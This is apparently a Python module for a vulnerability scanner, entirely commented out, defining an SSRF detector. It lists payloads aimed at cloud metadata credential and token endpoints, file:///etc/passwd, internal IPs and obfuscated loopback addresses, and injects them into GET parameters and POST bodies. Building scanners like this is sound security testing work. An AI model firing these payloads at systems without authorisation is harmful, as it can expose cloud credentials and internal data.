import asyncio
import ipaddress
from typing import List, Dict, Any
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from scanners import BaseDetector
from utils.http_client import HTTPClient
from environmentals import SCANNER_RATE_LIMIT_DELAY


# class SSRFDetector(BaseDetector):
#     def __init__(self, http_client, endpoints):
#         super().__init__(http_client, endpoints)
#         self.payloads = [
#             # Internal services
#             "http://localhost:80",
#             "http://127.0.0.1:22",
#             "http://0.0.0.0:8080",
#             "http://[::1]:80",
#             # Cloud metadata services
#             "http://169.254.169.254/latest/meta-data/",
#             "http://169.254.169.254/latest/user-data/",
#             "http://169.254.169.254/latest/dynamic/instance-identity/document",
#             # AWS specific
#             "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
#             "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME",
#             # GCP specific
#             "http://metadata.google.internal/computeMetadata/v1/",
#             "http://169.254.169.254/computeMetadata/v1/",
#             # Azure specific
#             "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
#             "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01",
#             # DigitalOcean
#             "http://169.254.169.254/metadata/v1/",
#             # File protocol
#             "file:///etc/passwd",
#             "file:///c:/windows/system32/drivers/etc/hosts",
#             # DNS rebinding
#             "http://localhost.pswal2.dnsrebind.net/",
#             # Special IPs
#             "http://10.0.0.1",
#             "http://192.168.1.1",
#             "http://172.16.0.1",
#             # Alternative representations
#             "http://0177.0.0.1/",  # Octal
#             "http://2130706433/",  # Decimal
#             "http://0x7f000001/",  # Hexadecimal
#         ]
#
#     async def detect(self, url: str, **kwargs) -> List[Dict[str, Any]]:
#         """Detect Server-Side Request Forgery vulnerabilities"""
#         vulnerabilities = []
#
#         # Test URL parameters
#         parsed_url = urlparse(url)
#         query_params = parse_qs(parsed_url.query)
#
#         # Common parameter names that might fetch URLs
#         url_parameters = [
#             "url",
#             "file",
#             "path",
#             "image",
#             "load",
#             "fetch",
#             "request",
#             "proxy",
#         ]
#
#         for param in query_params:
#             # Test if this parameter accepts URLs
#             if any(url_param in param.lower() for url_param in url_parameters):
#                 for payload in self.payloads:
#                     try:
#                         result = await self._test_ssrf_payload(url, param, payload)
#                         if result:
#                             vulnerabilities.append(result)
#                             break  # One finding per parameter is enough
#
#                         await asyncio.sleep(SCANNER_RATE_LIMIT_DELAY)
#
#                     except Exception as e:
#                         continue
#
#         # Also test POST endpoints that might accept URLs
#         post_endpoints = [
#             "/api/fetch",
#             "/api/proxy",
#             "/api/import",
#             "/api/webhook",
#             "/api/callback",
#             "/webhook",
#         ]
#
#         for endpoint in post_endpoints:
#             test_url = f"{url.rstrip('/')}{endpoint}"
#             for payload in self.payloads[:5]:  # Test first 5 payloads for POST
#                 try:
#                     result = await self._test_ssrf_post(test_url, payload)
#                     if result:
#                         vulnerabilities.append(result)
#                         break
#                 except:
#                     continue
#
#         return vulnerabilities
#
#     async def _test_ssrf_payload(
#         self, base_url: str, param: str, payload: str
#     ) -> Dict[str, Any]:
#         """Test SSRF with a specific payload in GET parameter"""
#         try:
#             parsed_url = urlparse(base_url)
#             query_params = parse_qs(parsed_url.query)
#
#             # Replace parameter with SSRF payload
#             test_params = query_params.copy()
#             test_params[param] = [payload]
#
#             test_query = urlencode(test_params, doseq=True)
#             test_url = urlunparse(
#                 (
#                     parsed_url.scheme,
#                     parsed_url.netloc,
#                     parsed_url.path,
#                     parsed_url.params,
#                     test_query,
#                     parsed_url.fragment,
#                 )
#             )
#
#             response = await self.http_client.send_request("GET", test_url, timeout=8.0)
#
#             # Analyze response for SSRF indicators
#             if self._is_ssrf_success(response, payload):
#                 return {
#                     "type": "Server-Side Request Forgery (SSRF)",
#                     "severity": "high",
#                     "parameter": param,
#                     "payload": payload,
#                     "evidence": self._get_ssrf_evidence(response, payload),
#                     "http_method": "GET",
#                     "url": test_url,
#                     "status_code": response.status_code,
#                     "description": "Application fetches external URLs without proper validation.",
#                     "remediation": "Validate and sanitize all URL inputs. Use allowlists for domains.",
#                     "confidence": 0.8,
#                 }
#
#         except Exception as e:
#             # Timeout or connection error might indicate successful internal connection
#             if "timeout" in str(e).lower() or "connect" in str(e).lower():
#                 return {
#                     "type": "Potential SSRF (Timeout)",
#                     "severity": "medium",
#                     "parameter": param,
#                     "payload": payload,
#                     "evidence": f"Request timed out when accessing internal resource: {payload}",
#                     "description": "Timeout when accessing internal resource may indicate SSRF vulnerability.",
#                     "remediation": "Implement URL validation and block internal IP ranges.",
#                     "confidence": 0.6,
#                 }
#
#         return None
#
#     async def _test_ssrf_post(self, url: str, payload: str) -> Dict[str, Any]:
#         """Test SSRF with POST request"""
#         try:
#             # Test with JSON body
#             response = await self.http_client.send_request(
#                 "POST", url, json={"url": payload, "target": payload}, timeout=8.0
#             )
#
#             if self._is_ssrf_success(response, payload):
#                 return {
#                     "type": "Server-Side Request Forgery (SSRF)",
#                     "severity": "high",
#                     "parameter": "POST body",
#                     "payload": payload,
#                     "evidence": self._get_ssrf_evidence(response, payload),
#                     "http_method": "POST",
#                     "url": url,
#                     "status_code": response.status_code,
#                     "description": "POST endpoint fetches external URLs without validation.",
#                     "remediation": "Validate all user input, including POST parameters.",
#                     "confidence": 0.8,
#                 }
#
#         except Exception as e:
#             if "timeout" in str(e).lower():
#                 return {
#                     "type": "Potential SSRF (Timeout)",
#                     "severity": "medium",
#                     "parameter": "POST body",
#                     "payload": payload,
#                     "evidence": f"POST request timed out accessing: {payload}",
#                     "description": "Timeout may indicate successful internal network access.",
#                     "remediation": "Implement strict URL validation for all endpoints.",
#                     "confidence": 0.6,
#                 }
#
#         return None
#
#     def _is_ssrf_success(self, response, payload: str) -> bool:
#         """Determine if SSRF payload was successful"""
#         response_text = response.text.lower()
#
#         # Check for specific content in response
#         if "localhost" in response_text and payload in response_text:
#             return True
#
#         if "127.0.0.1" in response_text and payload in response_text:
#             return True
#
#         if "metadata" in response_text and "169.254.169.254" in payload:
#             return True
#
#         if "ec2" in response_text and "169.254.169.254" in payload:
#             return True
#
#         if "file://" in payload and (
#             "root:" in response_text or "administrator" in response_text
#         ):
#             return True
#
#         # Check for AWS metadata structure
#         if any(
#             keyword in response_text
#             for keyword in ["instance-id", "ami-id", "hostname"]
#         ):
#             return True
#
#         # Successful response to internal service
#         if response.status_code == 200 and len(response.text) > 0:
#             # Check if this looks like a successful internal request
#             if any(
#                 service in response_text
#                 for service in ["ssh", "apache", "nginx", "iis"]
#             ):
#                 return True
#
#         return False
#
#     def _get_ssrf_evidence(self, response, payload: str) -> str:
#         """Extract evidence of successful SSRF"""
#         text_sample = response.text[:500]  # First 500 chars
#
#         if "metadata" in text_sample.lower():
#             return "Cloud metadata service response detected"
#         elif "root:" in text_sample or "administrator" in text_sample:
#             return "Local file access confirmed"
#         elif "localhost" in text_sample or "127.0.0.1" in text_sample:
#             return "Localhost access confirmed"
#         else:
#             return f"Successful request to internal resource: {payload}"
